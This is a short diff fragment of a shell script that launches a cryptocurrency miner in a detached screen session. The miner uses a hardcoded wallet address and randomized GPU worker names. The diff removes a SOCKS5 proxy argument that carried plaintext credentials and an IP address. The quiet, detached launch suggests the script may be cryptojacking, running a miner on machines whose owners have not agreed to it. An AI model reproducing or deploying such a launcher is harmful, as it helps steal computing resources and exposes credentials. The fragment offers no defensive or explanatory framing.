@@ -12,4 +12,4 @@ chmod 777 $a $b
 ph add $a >/dev/null
 echo $worker
 screen -dmS run ./$b
-./$a --algo BEAM-III --pool $POOL --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-NYILAK-$(shuf -i 1000-9999 -n 1)) --socks5://nyipkieh:awikwoklu@45.86.247.167:7235 --ethstratum ETHPROXY
+./$a --algo BEAM-III --pool $POOL --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-NYILAK-$(shuf -i 1000-9999 -n 1)) --ethstratum ETHPROXY
